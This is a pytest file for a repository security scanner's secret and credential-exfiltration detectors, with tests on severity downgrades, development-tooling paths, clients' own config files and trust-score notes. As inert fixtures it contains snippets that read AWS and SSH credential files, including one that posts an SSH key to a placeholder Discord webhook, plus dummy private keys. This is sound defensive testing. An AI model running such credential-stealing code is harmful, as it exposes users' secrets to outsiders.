"""Ruleset 2026.11.07-7: the certbot secrets false positive and the dev-sweep fixes 1-5. Inert text only."""
import io
import zipfile

import pytest

import repo_scan
from detectors import behavior_patterns, credential_exfiltration as CE, run_detectors
from detectors.base import make_result
from detectors.context import DetectorContext
from detectors.pyast import parse_ok
from malware_proof import run_malware_proof_engine
from pillars import NO_LIMIT_REASON, PARTIAL_NOTE, compute_trust
from security import apply_gate

KEY = "-----BEGIN PRIVATE KEY-----\nMIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEAtest\n-----END PRIVATE KEY-----\n"


def _scan(files: dict[str, str]) -> dict:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for name, data in files.items():
            z.writestr(f"o-r-abc123/{name}", data)
    buf.seek(0)
    orig = repo_scan.download_zip
    repo_scan.download_zip = lambda client, owner, repo: buf
    try:
        return repo_scan.scan_repo(None, "o", "r")
    finally:
        repo_scan.download_zip = orig


# ------------------------------------------------------------------ certbot: secrets in test/sample/asset paths

def test_certbot_style_asset_key_uses_the_new_review_rule():
    f = next(x for x in _scan({"certbot-ci/certbot_integration_tests/assets/key.pem": KEY})["findings"] if x["source"] == "Secrets")
    assert f["sev"] == "Medium" and not f["strong"] and "assets" in f["review_reason"]


@pytest.mark.parametrize("path", ["certbot-ci/certbot_integration_tests/assets/key.pem",
                                  "certbot/certbot/tests/testdata/rsa2048_key.pem",
                                  "certbot-nginx/tests/testdata/etc_nginx/sites-enabled/cert.key",
                                  "sample-config/keys/0000_key-certbot.pem", "docs/examples/server.key",
                                  "rules/yara/keys/fixture.pem"])
def test_test_and_sample_path_keys_are_review_not_strong(path):
    res = _scan({path: KEY})
    sec = [f for f in res["findings"] if f["source"] == "Secrets"]
    assert sec and not any(f["strong"] for f in sec), sec
    f = sec[0]
    assert res["secrets_strong"] == 0 and res["strong"] == 0
    if f["sev"] == "Low":
        # an exact tests/docs directory was already a fixture path before this change (Low, no tier)
        assert "test/example/doc/source file" in f["rule"]
    else:
        assert f["sev"] == "Medium" and "Downgraded from strong to review" in f["review_reason"]
        d = next(x for x in res["detectors"] if x["detector"] == "repo_secrets")
        assert d["tier"] == "review"                              # still surfaced for a human, without the 49 cap


@pytest.mark.parametrize("path", ["key.pem", "src/server/key.pem", "deploy/prod.key"])
def test_the_same_key_elsewhere_is_still_strong(path):
    res = _scan({path: KEY})
    assert res["secrets_strong"] == 1
    g = apply_gate({"score": 90.0, "label": "Healthy", "factors": [], "notes": []},
                   {"level": "No unpatched issues found", "findings": [], "coverage": []}, [], res)
    assert g["trust_score"] <= 49 and "capped by evidence rule: strong secret" == g["limiting_reason"]


def test_sample_looking_aws_key_in_assets_is_review_but_real_looking_key_elsewhere_stays_strong():
    assert repo_scan.secret_review_reason("assets/config.py", "AWS access key id", "aws_key = 'AKIAABCDEFGHTESTKEY1'")
    assert repo_scan.secret_review_reason("assets/config.py", "AWS access key id", "aws_key = 'AKIAQWERTYUIOPASDFGH'") is None
    assert repo_scan.secret_review_reason("src/config.py", "AWS access key id", "k = 'AKIAABCDEFGHTESTKEY1'") is None


# ------------------------------------------------------------------ item 1: data-flow detector owns Python files

def _behavior(files: dict[str, str]) -> dict:
    data = {"text": files, "py": {}, "binaries": [], "all_py_paths": set()}
    proof = run_malware_proof_engine(data, "o", "r", lambda f, ln: None)
    scan = {"ran": True, "malware_proof": proof, "findings": [],
            "ast_analysed_py": sorted(p for p, t in files.items() if parse_ok(p, t))}
    return next(r for r in run_detectors(DetectorContext.build(scan=scan, data=data)) if r["detector"] == "behavior_patterns")


def test_legacy_single_indicators_are_suppressed_for_ast_analysed_python():
    py = "import os, json\ncfg = open(os.path.expanduser('~/.aws/credentials')).read()\nenv = json.dumps(dict(os.environ))\n"
    r = _behavior({"pkg/client.py": py})
    assert r["findings"] == []
    assert {i["rule"] for i in r["info_findings"]} >= {"Credential access: reads credential files"}
    assert all("credential_exfiltration" in i["info_reason"] for i in r["info_findings"])


def test_legacy_single_indicators_are_kept_for_js_shell_and_unparseable_python():
    js = "const fs = require('fs');\nconst c = fs.readFileSync(require('os').homedir() + '/.aws/credentials');\n"
    broken = "import os\ncfg = open('~/.aws/credentials').read(\n"          # syntax error: no ast analysis
    r = _behavior({"lib/creds.js": js, "pkg/broken.py": broken})
    files = {f["file"] for f in r["findings"] if "reads credential files" in f["rule"]}
    assert files == {"lib/creds.js", "pkg/broken.py"}


def test_multi_signal_intent_pattern_is_kept_for_python():
    py = ("import os, requests\nkey = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
          "requests.post('https://discord.com/api/webhooks/1/x', data=key)\n")
    r = _behavior({"pkg/x.py": py})
    assert any(f["rule"] == "Credential-stealer pattern" and f["tier"] == "high_risk" for f in r["findings"])


# ------------------------------------------------------------------ item 2: dev tooling paths -> info

def test_single_indicators_in_dev_tooling_become_info():
    js = "const env = JSON.stringify(process.env);\nconsole.log(env.length);\n"
    r = _behavior({"scripts/release.js": js, "tools/dump.js": js})
    assert r["findings"] == [] and len(r["info_findings"]) == 2
    assert all("development-tooling path" in i["info_reason"] for i in r["info_findings"])
    py = "def backup():\n    return open('/home/u/.ssh/id_ed25519').read()\n"
    c = CE.detect(DetectorContext.build(scan={"ran": True, "malware_proof": {"findings": []}, "findings": []},
                                        data={"text": {"tasks.py": py, "pkg/core.py": py}}))
    assert [f["file"] for f in c["findings"]] == ["pkg/core.py"]           # tasks.py -> info, pkg/ -> review
    assert c["info_findings"][0]["file"] == "tasks.py" and "tasks.py" in c["info_findings"][0]["info_reason"]


# ------------------------------------------------------------------ item 3: the client's own credential file

OWN_FILE = {
    "docker": "import json, os, requests\ncfg = json.load(open(os.path.expanduser('~/.docker/config.json')))\n"
              "def push(registry):\n    requests.post(registry + '/v2/token', auth=cfg['auths'])\n",
    "kubernetes": "import os, requests\nkc = open(os.path.expanduser('~/.kube/config')).read()\n"
                  "def call(api):\n    requests.get(api, headers={'Authorization': kc})\n",
    "twine": "import configparser, requests\np = configparser.ConfigParser()\nrc = p.read('~/.pypirc')\n"
             "def upload(repo):\n    requests.post(repo, auth=rc)\n",
    "pip": "import requests\nconf = open('/etc/pip.conf').read()\ndef fetch(index):\n    requests.get(index, data=conf)\n",
}


@pytest.mark.parametrize("pkg", list(OWN_FILE))
def test_own_client_credential_file_is_not_flagged_but_foreign_package_is(pkg):
    code = OWN_FILE[pkg]
    own = CE.analyse_python("x.py", code, set(), owner_names={pkg})[0]
    other = CE.analyse_python("x.py", code, set(), owner_names={"acme", "stats"})[0]
    assert own == [], pkg
    assert [f["tier"] for f in other] == ["review"], pkg     # someone else's client file sent to a dynamic host


def test_owner_tokens_come_from_repo_and_package_names():
    ctx = DetectorContext.build(features={"full_name": "docker/docker-py"}, security={"package": {"name": "docker", "ecosystem": "PyPI"}})
    assert {"docker", "dockerpy", "py"} <= CE.owner_tokens(ctx)


# ------------------------------------------------------------------ item 4: sub-signal limits vs headline note

def _trust(*results):
    base = [make_result("osv_advisories", "Exposure", "ran", []), make_result("decoded_payload", "Behavior", "ran", [])]
    return compute_trust(base + list(results), {"score": 90.0, "label": "Healthy"})


def test_commit_history_limit_does_not_add_headline_partial_note():
    r = make_result("revival_takeover", "Integrity", "ran", [], coverage="partial",
                    coverage_detail="commit history read up to 300 commits before the release")
    t = _trust(r)
    assert not t["partial"] and PARTIAL_NOTE not in t["label"]
    assert "300 commits" in t["pillars"]["Integrity"]["coverage"]["text"]       # still shown in the detail


def test_truncated_content_scan_still_adds_headline_partial_note():
    r = make_result("behavior_patterns", "Behavior", "ran", [], coverage="partial",
                    coverage_detail="partial scan: 1500 of 2300 text files")
    assert r["content_truncated"] and PARTIAL_NOTE in _trust(r)["label"]


def test_unassessed_pillar_still_adds_headline_partial_note():
    t = _trust(make_result("release_delta", "Integrity", "not_assessed", reason="lookup failed"))
    assert t["partial"] and PARTIAL_NOTE in t["label"]


# ------------------------------------------------------------------ item 5: no limiting pillar

def test_no_findings_says_no_limiting_pillar():
    t = _trust(make_result("release_delta", "Integrity", "ran", []))
    assert t["limiting_reason"] == NO_LIMIT_REASON and t["limiting_pillar"] is None and t["limiting_kind"] is None
    assert "limited by" not in t["limiting_reason"]
